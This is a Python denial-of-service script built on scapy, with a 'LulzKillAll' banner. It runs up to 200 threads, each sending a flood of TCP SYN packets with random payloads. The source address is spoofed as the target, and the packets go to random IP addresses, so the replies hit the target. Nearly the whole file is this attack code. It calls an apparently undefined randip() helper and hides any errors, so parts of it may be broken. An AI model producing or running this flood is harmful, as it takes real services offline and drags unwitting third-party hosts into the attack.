import threading, sys, os, time
from random import randint
from scapy.all import *

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            ip = IP(src=host, dst=randip())
            tcp = TCP(sport=RandShort(),dport=int(port),flags="S")
            raw = Raw(os.urandom(randint(1024, 2048)))
            send(ip/tcp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$   /$$ /$$$$$$ /$$       /$$        /$$$$$$  /$$       /$$      
            | $$                | $$          | $$  /$$/|_  $$_/| $$      | $$       /$$__  $$| $$      | $$      
            | $$       /$$   /$$| $$ /$$$$$$$$| $$ /$$/   | $$  | $$      | $$      | $$  \ $$| $$      | $$      
            | $$      | $$  | $$| $$|____ /$$/| $$$$$/    | $$  | $$      | $$      | $$$$$$$$| $$      | $$      
            | $$      | $$  | $$| $$   /$$$$/ | $$  $$    | $$  | $$      | $$      | $$__  $$| $$      | $$      
            | $$      | $$  | $$| $$  /$$__/  | $$\  $$   | $$  | $$      | $$      | $$  | $$| $$      | $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$ \  $$ /$$$$$$| $$$$$$$$| $$$$$$$$| $$  | $$| $$$$$$$$| $$$$$$$$
            |________/ \______/ |__/|________/|__/  \__/|______/|________/|________/|__/  |__/|________/|________/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')